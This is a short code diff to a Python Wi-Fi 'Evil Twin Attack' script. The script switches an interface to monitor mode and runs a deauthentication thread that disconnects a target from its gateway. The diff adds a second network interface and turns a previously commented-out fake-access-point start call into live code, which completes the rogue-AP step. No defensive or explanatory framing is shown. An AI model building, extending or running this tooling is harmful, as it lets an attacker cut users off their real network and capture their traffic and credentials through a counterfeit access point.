@@ -12,6 +12,7 @@ import signal
 
 
 iface = ""
+net_stick_iface = ""
 users_list = []
 ap_list = []
 ssid_list = []
@@ -62,6 +63,7 @@ def DisConnectAttack(target_mac , gateway_mac, iface):
 def main():
     global iface ,ap_mac
     iface = input("please enter your interface: ")
+    net_stick_iface= input("Please enter the of your net-stick interface: ")
     iface = mm.Change_to_MonitorMode_airmon(iface)
     print("********Evil Twin Attack*********")
     time.sleep(1)
@@ -82,7 +84,7 @@ def main():
         disconnectThread.start()
         time.sleep(3)
         print("process keep going...")
-        #fa.start(iface)
+        fa.start(net_stick_iface)
         while True:
             try:
                 time.sleep(2) 
